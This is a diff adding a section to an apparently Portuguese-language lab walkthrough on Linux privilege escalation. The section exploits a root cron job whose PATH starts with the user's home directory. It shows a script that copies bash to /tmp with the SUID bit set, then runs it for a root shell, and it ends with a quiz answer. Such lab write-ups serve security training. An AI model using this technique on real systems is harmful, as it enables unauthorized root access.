@@ -408,3 +408,57 @@ Agora, basta aguardar a execução do cron job para ter uma sessão de shell rev
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 9 - Cron Jobs - PATH Environment Variable 
+
+Ao visualizar o conteúdo do arquivo ***/etc/crontab***, pode-se perceber que existem variáveis de ambientes configuradas. Algumas vezes, pode ter uma variável de ambiente para um caminho que tenha permissão mais flexível, permitindo exploração.
+
+```shell
+user@debian:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
+Observa-se que a variável PATH começa com ***/home/user*** que é o diretório inicial do nosso usuário.
+
+Crie um arquivo chamado overwrite.sh no diretório do usuário com o seguinte conteúdo:
+
+```bash
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+Basicamente, o script acima vai copir o binário do ***bash*** para ***/tmp*** com o nome ***rootbash***. Em seguida, adiciona-se permissão SUID, com o objetivo de executar com elevação de privilégios.
+
+Para o arquivo overwrite.sh seja executado pelo crontab, é preciso adicionar permissão de execução a ele:
+
+```shell
+chmod +x overwrite.sh
+```
+
+Agora, basta aguardar a execução do cron job (não deve demorar mais de um minuto). Execute o comando /tmp/rootbash com -p para obter um shell rodando com privilégios de root:
+
+```shell
+/tmp/rootbash -p
+```
+Um shell de superusuário será aberto. Por que isso ocorreu? Pelo fato da variável de ambiente que estava setada para procurar executáveis no diretório home do usuário, ou seja, um diretório que um usuário limitado tem permissão. 
+
+### Questões:
+
+- a. ***What is the value of the PATH variable in /etc/crontab?*** */home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin*
